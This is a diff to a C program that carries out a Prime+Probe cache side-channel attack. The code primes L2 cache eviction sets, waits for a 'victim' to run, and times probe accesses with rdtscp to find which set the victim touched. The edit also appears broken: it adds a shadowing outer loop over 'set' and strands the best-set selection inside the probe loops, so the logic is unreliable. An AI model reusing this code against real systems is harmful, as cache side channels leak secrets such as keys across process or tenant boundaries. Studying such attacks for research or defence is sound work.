@@ -86,33 +86,47 @@ int main() {
 
         
 
-        for(int r = 0; r < REPEATS; r++) {
+        
+        int best_set = 0;
+        uint64_t best_score = 0;
+
+        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
+            for(int r = 0; r < REPEATS; r++) {
+
             int perm[NUM_L2_CACHE_SETS];
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
                 perm[i] = i;
-            }
 
             shuffle(perm);
+
+            /* PRIME ALL SETS */
 
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
 
                 int set = perm[i];
 
-                /* PRIME this set */
-                for(int w = 0; w < WAYS; w++) {
+                for(int w = 0; w < WAYS; w++)
                     tmp ^= *eviction_sets[set][w];
-                }
+            }
 
-                wait_cycles(8000);
+            /* allow victim to run */
 
-                /* PROBE this set */
+            wait_cycles(8000);
+
+            /* PROBE ALL SETS */
+
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
+                int set = perm[i];
 
                 uint64_t total_time = 0;
 
                 for(int w = WAYS - 1; w >= 0; w--) {
+
                     uint64_t start = rdtscp();
                     tmp ^= *eviction_sets[set][w];
                     uint64_t end = rdtscp();
+
                     total_time += (end - start);
                 }
 
@@ -120,10 +134,6 @@ int main() {
                     scores[set]++;
             }
         }
-        int best_set = 0;
-        uint64_t best_score = 0;
-
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
 
             if(scores[set] > best_score) {
                 best_score = scores[set];
